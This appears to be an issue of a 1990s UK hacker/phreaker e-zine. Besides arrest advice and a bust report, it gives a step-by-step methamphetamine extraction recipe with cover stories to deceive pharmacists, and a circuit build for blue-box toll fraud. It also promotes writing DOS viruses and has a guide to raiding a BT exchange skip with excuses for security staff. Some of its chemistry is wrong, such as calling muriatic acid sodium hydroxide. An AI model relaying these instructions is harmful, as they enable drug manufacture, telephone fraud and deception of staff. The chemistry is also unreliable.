HarLeQuin sayz:
        Right, I guess you're thinking, 'Oh another h/p group that's 
gonna be around for a couple o' months before disappearing in a flurry 
of vitriolic slagging and allegations'. Well you're probably right. But 
dah thing is...

                            WE DON'T GIVE A F%@# !

        We're having a laff and apart from getting in a bit of serious 
debauchery and technology abuse we're here to have FUN and to give 'em 
something to type about on IRC. So to start dah ball rolling... 
Harlequin is a narq and he shags various small mammals. I have faked 
ASCEE docs to prove it. I'll even go on IRC and say 'Hey Harl got me and 
my 4,000 strong h/p group busted last week just so he could get off 
loading dah dishwasher' and everyone will go 'Yeah ?!?!?!? Well I better 
slag him off so I dont look lame in front of all dah 3l33t haqrz 0n 
|-|3r3' and then when I suck up enough to dah plus oh posse & eYe g3t 
0pz I'll ban him just to show what an 3l33t |-|aQr eYe Am !! Itz all 
true ! I swear ! I read it in dah /etc/true_things dir on 
eleet.haqrz.hangout

        Anyway, being mostly pissed off with the shit that gets thrown 
around I dont really give a f**k what ppl say about me 'cos 99.99% of it 
isn't true. So if you want to let everyone know I'm a lamer/sheep 
shagger/narq/warez d00d feel free ! You're wasting yah ASCEE keystrokes, 
save it for someone who gives half a toss.

On a more light hearted note - hope ya enjoy the rest of the text...

                                Getting Nicked
                                ~~~~~~~~~~~~~~
                    or what to do when you're arrested...
                    
Did you know over 70% of all convictions are made on the basis of what 
was said in the interview. What does this mean practically ??

                         WHEN TALKED TO  ---> SHUT UP

        Yep that's it. I know this is going to be mind-blastingly hard, 
especially for Phreaks who have an innate ability to talk constantly. 
But hopefully the lack of a telephone in the vicinity may keep you 
quiet. You simply answer 'No Comment' to *ANY* interview questions 
asked. Also the Police may start chatting to you informally when you're 
in the police car/holding cell/police custody cell/anywhere else. Don't 
give them any information that can help them. This means basically 
shutting up and answering only stuff such as you're name, address and 
other such formalities. They can't use this idle chat as evidence 
against you, but if they think you're innocent then they're gonna stop 
looking for evidence but if you say 'Yeah I did it copper and you can't 
prove nuthin' 'cos this aint recorded ha ha ha !' the're gonna keep 
looking until they find something.

        Answering 'No Comment' as a reply to an interview question is 
not an admission of guilt. If you're case goes to trial the interview 
tape will be played, and if you answer 'No Comment' to a question it's 
as if the question had not been asked. The prosecution cannot base 
anything on the fact you did not wish to answer the question. Another 
ploy the police will use is the bribery tactic... i.e. 'We have you're 
mates and they all said you did it - so unless you tell us something 
you're going down forever' - again no comment, this is a ploy just to 
get you to talk. Ratting on yer mates because they're gonna let you off 
easier is not only likely to get you lynched as soon as you walk out the 
door, but it also won't work, so don't try it. Also they will try and 
outrage you into defending yourself i.e. 'You have broken into 
Government computers and have defrauded more then 50,000 quids worth of 
stuff haven't you ??'. This is another ploy to make you go 'No way I 
haven't done anything like that!' - bite your tongue, they will simply 
try to get you talking.

        Being in a police cell is a completely miserable experience and 
being told 'If you tell us something you can be on the next bus outta 
here' is an extremely attractive prospect after being locked up in a 6x4 
room for 8 hours. But all these are all cunning psychological tricks 
used to get convictions (after all this is what they're paid for).

        And finally... You have been bright enough to PGP encrypt all 
your sensitive info with a 1024 bit key and a bloody long password 
haven't you ??? And you have completely shredded all unwanted dodgy 
stuff haven't you ?? (Yeah, not just deleted - electronically SHREDDED). 
It might be worth mentioning that if you're HD is compressed with 
Stacker or any other compression utility then its almost impossible to 
completly erase deleted files by writing over them....

        This advice is not just stuff from the top of my head. It's from 
experience - bitter experience. The bright thing to do is not to get 
nicked in the first place either by:- 

a) Not breaking the law 
b) Having half a brain and not getting caught

                                 Plans for a
                          Digital -> Audio Convertor
                          ~~~~~~~~~~~~~~~~~~~~~~~~~~

        Some of you poorer phreaks may have noticed blue boxing is 
pretty impossible without a soundcard for your beloved PC or without 
being able to solder a circuit without burning your ear with the 
soldering iron. Anyway, this is a very simple circuit that produces 
perfect tones. Although it isn't new or cutting edge, its been included 
in Citronic for convenience sake, as when I was looking for it (quite 
some time ago) I couldn't find the circuit diagram anywhere. This will 
cost you a couple of quid/few dollars so is very cheap. When its built, 
attach it to your parallel port. Please note: the output has to be 
attached to an amplifier. My CD player works perfectly for this, most 
stereos will do.

This circuit requires:
9 x 20K resistors
9 x 10K resistors 
1 x 100 MFD capacitor  
25 pin DShell plug

        All the resitors are 1/4 watt and 1% tolerance. Make sure these 
are exact as the first DAC I built had 5% tolerance resistors and was 
crap. You might also want to add a female RCA plug to have a convenient 
way to connect it to an amplifier. The entire circuit can be built on 
the back of the 25 pin plug. Be sure to connect the two points labeled 
0v. No power supply is required. This circuit was included in an Amiga 
mod file player package by Mark J. Cox. He acknowledges Harry Stox for 
the circuit.

        Almost my entire phreaking career was using this device so it 
does work ! I recommend BlueDial software, its free and supports DACs. 
The current version at the time of writing is BDial v 6.1 Also there is 
alot of software around that lets you play/edit Amiga .MOD filez thru a 
DAC (just in case you're interested)

                                The Fade Virus
                              A Simple Dos Virus
                              ~~~~~~~~~~~~~~~~~~

        Viruses are usually ignored by hackers as 'novelties' or 'toys' 
but in fact they can be extremely useful. Especially when attacking DOS 
based network systems such as Novel. 
        They are also an excellent way to learn assembly language (for 
any platform) as you can go from very simple viruses to extremely 
complicated ones that require a working knowledge of the platform, 
whether documented or not. 
        They are also an artform, check out some of NuKE's/Phalcon 
Skism's work for some excellent examples. 
        Any common criminal with a copy of FORMAT can cause damage. Get 
creative - destructive viruses get a lame rating of 99. 8% Finally, if 
you want to get into this virus thing, check out #virus on IRC or 
Aristotle's BBS, Black Axis on (804) 599-4152. 40HEX magazine (by 
Skism/Phalcon) and NuKE Info Journals are a mine of information, if you 
can get hold of them.
        Anyway, I have included a totally original, very simple virus I 
wrote some time ago. I made it as simple as possible so it's easy to 
learn from and adapt. It's easily modified and very easy to understand. 
So have a play around with it and see what you can come up with.

                              Speed/Whiz Recipe
                              ~~~~~~~~~~~~~~~~~
0K, many of you may have seen this or a similar recipe floating around, 
well I thought I'd reprint it with a few of my own comments and hints. 
This is not another one of those dodgy drugz files, this actually works 
and I have succesfully made some. So I thought I'd pass on the benifit 
of my experience :) 

----------------------------------------------------------------------------
DISCLAIMER:
This is for informational purposes only, you use this information at 
entirely your own risk. Speed fucks you up, and if you don't make it 
right it can fuck you up without all the nice effects. 
----------------------------------------------------------------------------

Ingredients:
o  8 fluid ounces of Wood Alcohol Naphtha (It *HAS* to be wood alcohol 
   naphtha)
o  Muratic Acid (Sodium Hydroxide)
o  Acetone
o  1 bottle Vicks Nasal Spray (it *HAS* to be Vicks)

NAPHTHA - Can be obtained from a chemist (where I got it from) or from 
Hays Group UK (tel 081 853 1172). If you're going to get it from a 
chemist a good reason is for preserving butterflies (or other insects) 
for display. Try to get an older person to buy some because chemists 
*know* what it can be used for, in fact when I bought some the chemist 
said 'be careful with this, did you know sailors used to make drugs out 
of it ??'.

MURATIC ACID - This is driveway cleaner, go to a building site supplier 
for this. The mixture should be at least 14% Muratic Acid content, it's 
watered down with water. The driveway cleaner from places like B&Q has a 
very low muratic acid content, this is no good. Tell them your in the 
building trade, and you need the industrial stuff because you have loads 
of moss, cement and all other goodies over the brick work of your house 
you've just brought. Comes in 0.5 / 1.0 / 2.5 / 5.0 L containers. I said 
something like 'I hired a driveway cleaning machine off a local plant 
hire company (give a name) and they specified to use 14% Muratic Acid...'

ACETONE - get this from your chemist, it comes in small bottles, it can 
be brought over the counter without any problems. It is a solvent, say 
your using it to water down your oil paints, because your an artist or 
something or say its for nail varnish remover (usually works best)

VICKS NASAL SPRAY - just say you've got a cold for this one. They can be 
brought from most shops and all chemists. NOTE : IT MUST BE A VICK'S 
ONE, other makes don't have the right chemicals in. You need 1 spray per 
batch

Equipment:
o  1 eye dropper, yet again, get this from your chemist.
o  3 clear glass jars, about the size of a medium/large coffee jar, must have
   a screw lid on it, to stop nasty stuff going everywhere.
o  A saucepan (preferably non-stick)
o  A pair of plastic/rubber gloves


Instructions (follow these *EXACTLY*)

[1] Pour 8 fluid ounces of Naphtha into the coffee jar (making sure the 
    jar is cleaned out !)

[2] Cut open the Vicks inhaler with a sharp pair of cutters, remove the 
    cotton insert and throw away the plastic container. Place the cotton 
    insert in the jar with the Naphtha in it. (3).Put the lid on the jar
    and shake it for around 4-5 mins. You've got to get the chemicals in
    the Vicks to bond into the Naphtha. This is where the Methamphetamine
    comes from.

[3] Once this is done, squeeze out all the juices from the Vicks cotton, 
    (make sure your wearing gloves, other wise you'll end up with your
    hands stinging alot). Remove the cotton from the mixture.

[4] Next add 2 fluid ounces of hot water in to another jar, add 3 drops
    of muratic acid into the mixture (use this amount if your muratic 
    content is between 12 & 18 %, otherwise change the amount that is 
    mixed with the hot water)

[5] Now add the first jar, the one with the Naphtha and Vicks in it to 
    the second jar, the one with hot water and the acid in it. Now shake
    the jar for around 3 mins. Yet again you've got to get to chemicals
    to bond

[6] After this is done, spin the jar so that the liquid goes around 
    inside it, note the bubbles that come off. Try to remember the rate 
    of which they come off.

[7] Now let the mixture settle, this should be left for about 10 mins.
    You will see (should see) two layers in the jar. The stuff we're 
    after is the bottom layer. Use the eyedropper again, making sure 
    you've washed it out with hot water. DO NOT USE ANY CLEANING 
    CHEMICALS TO CLEAN IT WITH E.G. WASHING UP LIQUID Place the dropper
    into the mixture, and slowly draw off the bottom mixture, making sure
    you don't get any of the top mixture into it, this will F**k it up !
    Place the bottom layer straight into a non-stick pan, then take the 
    top layer save and place into a clean jar.

[8] Now heat up the mixture, using a very low heat. DO NOT USE A GAS 
    COOKER, as the chemicals you are using are flammable and you could do
    yourself and kitchen alot of damage.

[9] As the mixture evaporates, you will see that it will leave a white 
    (semi clear) film behind it. Methamphetamine crystallises in straight 
    lines, look for these lines as it drys out. Scrape it off with 
    something sharp and clean. Keep it in the pan.

[10] Now add a small amount of acetone into the pad. Just enough to cover 
     all the crystals.REMEMBER THIS STUFF IS HIGHLY FLAMMABLE. IT MAY BE 
     BEST TO LET THE PAN COOL A LITTLE BEFORE ENTERING IT. DO NOT USE NEAR 
     A NAKED FLAME, THAT MEANS NO SMOKING OR GAS COOKERS ! Keep the pan on
     the lowest heat possible, the acetone will evaporate.

[11] Once this is done, your left with your speed, scrape it out and off 
     you go !

[12] Next if you get the jar with the liquid you saved in step 7, and 
     then go back to step 5 and repeat the process. When you look at the
     bubbles, did you remember to look at them?, you need to get more or 
     less the same about off them, if you don't, then throw the mixture 
     away as it has had all the good stuff taken out of it. Carry on
     again and make some more !

Notes:
o  Make this outside or in a very well ventilated room, the fumes from 
   the chemical are flammable, can be nasty when inhaled and give you 
   thumping headaches. 

o  Making speed buggers up your pans, it took me ages to scrape yellow 
   gunk off them, I haven't tried with non-stick pans, but I would 
   imagine they work better. 

o  Cut the speed with powdered glucose, the stuff you buy in the street 
   is cut, and taking the same amount of home made stuff spins you out. 

o I have included my excuses for getting the stuff off chemists to give
  you an idea of what to do, try not to use the same ones here 'cos the 
  chemist is bound to say 'Hmmmmm, that's the fourth person in today for 
  Butterfly preservatives, so tell me more about your butterflies...'

Acknowledgements:
o  Charles and Karl from Spycom for the original recipe.
o  Smidge for being the first to make some and for his testing :)

TERMINAL BOREDOM BUST

I have been informed by Coaxial/PHATE that Maelstrom's "Terminal Boredom"
BBS has been raided. There has also been bust reports published in several
Scottish newspapers today, so expect more details soon.
 
xxxx-xxxxxx is not answering and I suggest people do not phone this
number until all the facts are known.

Phantasm (SysOp)

        Yes it's started to happen. Over the years the UK h/p community 
has got off lightly compared to our American and European counterparts. 
American suffered the 1990 'Hacker Crackdown' while in Britain we have 
had very little in the way of police attention except the occasional 
bust and arrest. 
        Then suddenly in the space of a year, global boxing, which had 
remained the same for the previous five years, goes down. Bulletin 
boards get raided and people get arrested. A 20 year old man in Plymouth 
was arrested for allegedly writing and spreading the SMEG viruses, which 
is an almost impossible charge to convict some-one on. If the police 
have decided that they want to nail people for writing viruses, then 
hackers and phreaks had better watch their backs.
        The Telcos and Corps have wised and decided that they're not 
going to tolerate their systems being 'abused' any longer. All we want 
to do is use hardware we can neither afford nor get legitimate access 
to. What average hacker/phreak can afford to pay the rediculous prices 
of commercial information systems (for such a dismal service) or get to 
play on mainframes and UNIX nets. Virtually none. 
        Then when we try to advanced our knowledge we are told by the 
same corporations and multi-nationals who fund the arms trade, exploit 
third world poverty and slowly poison the planet that *we* are 'abusing 
the system' are a threat to 'the fabric of society'.
        I am not a revolutionary, but I just beleive that knowledge
cannot be owned, and as hard as the Corps and Governments try to hide
information from us, we have the moral if not legal right to find it.
        Someone who was on Terminal Boredom sold the story to the police 
and the papers. Whoever you are, you've destroyed one of the pitifully 
few oasis's of free information left in the UK. I hope you are happy in 
the knowledge that you have saved the world from more 'evil' hackers who 
were busily menacing society. You are the pride of the great and the 
good, the Goverments and the Corps. 
        Fuck you.

                              Trashing B.T.
                              ~~~~~~~~~~~~~

                           "Its good to Phreak"

        You would think that after so many years of Hackers and Phreaks
screwing them over, BT would at least get some idea about site security.
Well apparently not, your local BT exchange is *still* and excellent
site for free telephone goodies and useful info, all kindly discarded by
our beloved phone co.
        Pr0d1gY decided to come and see me, so after a few hours of
messin' around with beige boxing we decided to have a look around the
local BT exchange. Its a reasonably big building, that's now almost
empty due to all the switching being done digitally. However, at night,
there are between 8 and 10 BT vehicles parked out the back aswell as a
large skip where everything is dumped. After half an hour of wading thru
their skip this is the list of stuff we took home:

1  x Old rotary dial phone.
10 x Phone Jack sockets of various types, including spike/surge shielded
     ones.
20   Metres of new phone cable, their was so much of this that whenever
     I need some more cable I just nip down and get some. There is 
     *loads* of it !
1  x Packet of Benson and Hedges Cigarettes (!)
2  x Installation manuals for cabling etc etc (including fibre optic
     cables, testing of alarm systems and data transmission)

...and pages and pages of order sheets.... These are probably the most 
useful of the things we found. On the sheet it details, the job the BT 
engineer is/was doing, exactly what the engineer was fixing/doing, the 
date of the job, order number of the item, order description, the 
engineer's name, the engineer's code, the address of where the job is 
being done, as well as other codes such as the zone code, part no.'s etc
etc etc. Prime bullshitting material, for either bullshitting BT or the
customer....
        The cabling and hardware proved to be very useful for beige
boxing, and the B&H proved the be useful for... errrr, nothing really.
        The BT exchange was completly deserted, and their were no
cameras of any sort about. Basically giving us as much time as we wanted
to look thru what they had left... One word of warning, if you're gonna
climb into a BT skip and you're gonna put your wallet into your top
pocket. Remember to do your pocket up ! 'Cos I didn't and it took us
bloody ages to find my wallet again.
        I recommend checking out the site a few days before at approx. 
the same time of day as your gonna have a wander round. Depending on the
size of the the exchange they may have security guards and/or cameras.
The exchange we did was purely that, an exchange only, it was not for
dealing with customers or anything else. In my experience BT buildings
that are used for purposes other than purely engineering/maintenance are
better guarded than your average exchange, so be careful...
        If questionned at all think of a good excuse, as long as your
not knee deep in telephone cable and standing in a skip an excuse like
'I am looking for a lost cat' is usually sufficient, as long as you
clear off pretty soon, you can always come back later...
        All my telephone supplies are now gained from BT free of charge, 
so you'll never have to pay for anything again :)
